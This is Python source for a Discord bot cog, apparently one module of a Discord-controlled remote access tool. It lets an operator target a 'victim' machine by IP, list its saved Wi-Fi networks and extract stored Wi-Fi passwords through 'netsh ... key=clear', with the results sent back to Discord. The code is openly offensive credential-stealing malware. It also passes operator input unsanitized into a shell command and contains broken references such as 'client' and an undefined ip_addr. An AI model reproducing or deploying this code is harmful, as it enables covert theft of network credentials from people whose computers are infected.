import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class Wifi(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @client.slash_command(description="Lists all wifi networks")
    async def wifilist(ctx, victim):
        if str(victim) == str(ip_addr):
            await ctx.response.send_message(f"```{os.popen('netsh wlan show profiles').read().replace('All', '').replace('Profile', 'Network')}```")

    @client.slash_command(description="Lists specified wifi password")
    async def wifipass(ctx, victim, name):
        if str(victim) == str(ip_addr):
            a = os.popen('netsh wlan show profile '+'"'+name.lstrip().rstrip()+'" '+"key=clear | findstr Key")
            await ctx.response.send_message(f"```{a.read()}```")

def setup(bot: commands.Bot):
    bot.add_cog(Wifi(bot))